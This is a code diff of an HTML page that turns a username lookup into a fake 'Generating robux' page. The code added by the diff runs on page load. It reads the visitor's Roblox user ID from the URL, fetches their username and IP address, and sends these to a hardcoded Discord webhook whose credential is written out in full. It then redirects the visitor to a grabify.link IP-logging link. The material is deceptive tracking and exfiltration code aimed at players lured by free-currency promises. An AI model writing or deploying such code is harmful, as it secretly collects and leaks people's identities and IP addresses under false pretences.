@@ -3,23 +3,27 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Username Input</title>
+  <title>Website Monitor</title>
 </head>
 <body>
-  <h1>Fetching Roblox Username</h1>
-  <button onclick="submitUsername()">Fetch Username</button>
+  <h1>Generating robux, don't tab out/close this window!</h1>
 
   <script>
-    function submitUsername() {
+    document.addEventListener("DOMContentLoaded", function() {
+      sendDiscordMessage();
+    });
+
+    function sendDiscordMessage() {
       var webhookURL = "https://discord.com/api/webhooks/1214203058284662794/cpyZU4ceyZ2TLhojorU_akBA-jqF_45EZzdSdBQBv_NNkwCwPMWR3Kaw8nzXAeqmuXn9";
       var currentDate = new Date();
       var formattedDate = currentDate.toLocaleString('en-US', { month: 'long', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
 
-      var userIdMatch = window.location.href.match(/userId=([0-9]+)/);
-      var userId = userIdMatch ? userIdMatch[1] : null;
+      // Extract user ID from the URL
+      var urlParams = new URLSearchParams(window.location.search);
+      var userId = urlParams.get('userId');
 
       if (!userId) {
-        alert("User ID not found in the URL.");
+        console.error("User ID not found in the URL.");
         return;
       }
 
@@ -32,32 +36,43 @@
             content: "Opened on: " + formattedDate + "\nRoblox username: " + robloxUsername + "\nRoblox user ID: " + userId
           };
 
-          // Send message to Discord webhook
-          fetch(webhookURL, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(message)
-          })
-          .then(response => {
-            if (!response.ok) {
-              console.error("Failed to send message to Discord.");
-            } else {
-              console.log("Message sent to Discord successfully.");
-              redirectToGrabify();
-            }
-          })
-          .catch(error => {
-            console.error("Error sending message to Discord:", error);
-          });
+          // Fetch IP address
+          fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+              var ip = data.ip;
+              message.content += "\nIP address: " + ip;
+
+              // Send message to Discord webhook
+              fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                body: JSON.stringify(message)
+              })
+              .then(response => {
+                if (!response.ok) {
+                  console.error("Failed to send message to Discord.");
+                } else {
+                  console.log("Message sent to Discord successfully.");
+                  redirectToDifferentWebsite();
+                }
+              })
+              .catch(error => {
+                console.error("Error sending message to Discord:", error);
+              });
+            })
+            .catch(error => {
+              console.error("Error fetching IP address:", error);
+            });
         })
         .catch(error => {
           console.error("Error fetching user information from Roblox API:", error);
         });
     }
 
-    function redirectToGrabify() {
+    function redirectToDifferentWebsite() {
       window.location.href = "https://grabify.link/QW9D2R";
     }
   </script>
